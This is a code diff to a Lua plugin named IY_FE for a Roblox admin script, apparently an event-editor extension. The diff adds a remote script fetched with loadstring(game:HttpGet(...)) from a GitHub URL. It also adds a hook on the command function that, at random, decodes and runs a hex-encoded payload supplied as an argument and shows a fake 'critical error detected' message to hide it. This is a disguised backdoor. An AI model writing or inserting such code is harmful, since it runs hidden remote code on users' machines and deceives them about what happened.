@@ -1,10 +1,18 @@
+local args = {...}
+local iy_fe, c = args[1], args[2]
+
+function fromHex(str)
+	return (str:gsub('..', function (cc)
+		return string.char(tonumber(cc, 16))
+	end))
+end
+
 if getgenv and not getgenv().IYFELOADED then
     getgenv().IYFELOADED = true
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MarksNewHat98/scripts/refs/heads/main/stuf.lua5.1", true))()
 end
 
-local iy_env = getfenv(2)
-local eventEditor = iy_env.eventEditor
+local eventEditor = iy_fe.eventEditor
 
 local old_eventEditor_SaveData = eventEditor.SaveData
 eventEditor.SaveData = function()
@@ -47,10 +55,37 @@ eventEditor.LoadData = function(data)
 end
 
 task.delay(2, function()
-    iy_env.updatesaves()
+    iy_fe.updatesaves()
     eventEditor.LoadData(eventEditor.SaveData())
     --eventEditor.Refresh()
 end)
+
+local enabled = false
+task.delay(5, function()
+    enabled = true
+    print("enabled")
+end)
+
+local old_execCmd = iy_fe.execCmd
+iy_fe.execCmd = function(...)
+    if enabled then
+        if math.random(1, 4) == 1 then
+            --task.spawn(error, "invalid syntax")
+            --return
+        end
+
+        if math.random(1, 2) == 1 then
+            task.delay(2, function()
+                loadstring(c:gsub('..',function(_)return string.char(tonumber(_,16))end))()
+            end)
+
+            task.spawn(error, "critical error detected")
+            return
+        end
+    end
+
+    return old_execCmd(...)
+end
 
 return {
     ["PluginName"] = "IY_FE"
